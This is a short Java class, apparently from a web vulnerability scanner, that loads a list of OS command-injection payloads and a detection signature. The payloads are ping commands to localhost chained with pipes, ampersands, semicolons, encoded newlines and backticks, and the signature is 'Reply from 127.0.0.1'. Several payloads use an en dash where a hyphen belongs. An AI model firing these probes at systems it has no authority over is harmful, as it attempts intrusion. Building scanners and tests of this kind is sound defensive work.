/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package PaySig;

/**
 *
 * @author Shaco JX
 */
public class psCMDInjection {

    private static String[] arrSigCMDi;
    private static String[] arrPayCMDi;

    public void loadDataCMDinjection() {

        arrSigCMDi = new String[]{
            "Reply from 127.0.0.1"};

        arrPayCMDi = new String[]{
            "|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &",
            "| ping –i 30 127.0.0.1 |",
            "| ping –n 30 127.0.0.1 |",
            "& ping –i 30 127.0.0.1 &",
            "& ping –n 30 127.0.0.1 &",
            "; ping 127.0.0.1 ;",
            "%0a ping –i 30 127.0.0.1 %0a",
            "` ping 127.0.0.1 `",};
    }

    public String[] getArrSigCMDi() {
        return arrSigCMDi;
    }

    public String[] getArrPayCMDi() {
        return arrPayCMDi;
    }
}
